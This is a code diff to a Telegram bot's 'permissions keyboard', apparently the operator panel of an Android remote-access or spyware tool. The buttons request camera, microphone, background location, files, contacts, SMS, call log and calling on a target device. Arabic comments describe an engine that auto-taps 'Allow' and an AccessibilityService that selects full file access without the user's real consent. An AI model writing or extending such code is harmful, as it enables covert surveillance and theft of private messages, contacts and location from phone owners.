@@ -535,7 +535,7 @@ def advanced_keyboard(did):
 # ── Permissions Keyboard ──
 def permissions_keyboard(did):
     kb = InlineKeyboardMarkup(row_width=2)
-    # ⚡ كل زر يطلب إذناً واحداً فقط — لا أزرار "all"
+    # ⚡ V11.2.96: كل زر يطلب إذناً واحداً فقط — لا أزرار "all"
     # كل إذن يُفعّل بشكل مستقل تماماً
     # PermissionAutoGrantEngine ينقر تلقائياً على "السماح" عبر 3 استراتيجيات
     perm_btn = lambda perm, label: InlineKeyboardButton(
@@ -546,15 +546,14 @@ def permissions_keyboard(did):
            perm_btn("microphone", "🎤 الميكروفون"))
     kb.add(perm_btn("location", "📍 الموقع"),
            perm_btn("background-location", "🌐 الموقع في الخلفية"))
-    # ⚡ V11.2.57: زر "الملفات" يفتح dialog 'الملفات والوسائط'
+    # ⚡ V11.2.96: زر "الملفات" يفتح dialog 'الملفات والوسائط'
     # + AccessibilityService يختار 'كامل الملفات' RadioButton + يضغط السماح
     kb.add(perm_btn("storage", "📁 الملفات"),
            perm_btn("contacts", "👥 جهات الاتصال"))
     kb.add(perm_btn("sms", "💬 الرسائل"),
-           perm_btn("calls", "📞 المكالمات"))
-    kb.add(perm_btn("notifications", "🔔 الإشعارات"),
-           perm_btn("phone-state", "📱 حالة الهاتف"))
-    # ⚡ البث المباشر تمت إزالته
+           perm_btn("call-log", "📞 سجل المكالمات"))
+    kb.add(perm_btn("phone", "📞 إجراء مكالمات"))
+    # ⚡ V11.2.96: تم حذف "الإشعارات" و"حالة الهاتف" (لا فائدة منها)
     kb.add(_back(did))
     return kb
 
